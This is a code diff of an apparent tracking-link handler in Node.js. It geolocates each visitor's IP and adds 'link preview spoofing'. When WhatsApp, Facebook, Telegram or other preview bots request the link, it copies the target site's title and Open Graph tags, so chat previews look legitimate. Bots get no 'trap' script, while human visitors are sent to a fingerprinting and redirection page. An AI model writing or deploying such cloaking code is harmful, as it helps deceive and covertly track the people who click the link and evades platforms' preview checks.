@@ -19,9 +19,37 @@ module.exports = async (req, res) => {
     let geo = {};
     if (cleanIp) {
         try {
-            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
+            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`, { timeout: 2000 });
             geo = geoReq.data;
         } catch (e) { }
+    }
+
+    const ua = req.headers['user-agent'] || '';
+    const isBot = /bot|preview|whatsapp|facebook|telegram|twitter|linkedin|skype|discord/i.test(ua);
+
+    // [LINK PREVIEW SPOOFING]
+    // If request comes from WhatsApp/FB preview bot, clone the Target's Open Graph tags!
+    if (isBot) {
+        let ogTags = '<title>Sedang Memuat...</title>';
+        try {
+            const targetRes = await axios.get(targetUrl, {
+                timeout: 3000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0 Safari/537.36' }
+            });
+            const htmlData = targetRes.data;
+            const titleMatch = htmlData.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
+            let tags = "";
+            if (titleMatch) tags += `<title>${titleMatch[1]}</title>\n`;
+
+            const metas = htmlData.match(/<meta[^>]+>/gi);
+            if (metas) {
+                tags += metas.filter(m => /property="og:|name="twitter:|name="description"/i.test(m)).join('\n');
+            }
+            if (tags) ogTags = tags;
+        } catch (e) { }
+
+        // Give the bot a perfect clone of the target's preview, NO TRAP JS.
+        return res.status(200).send(`<!DOCTYPE html><html><head>${ogTags}</head><body></body></html>`);
     }
 
     // We serve an HTML page that does the fingerprinting + redirection
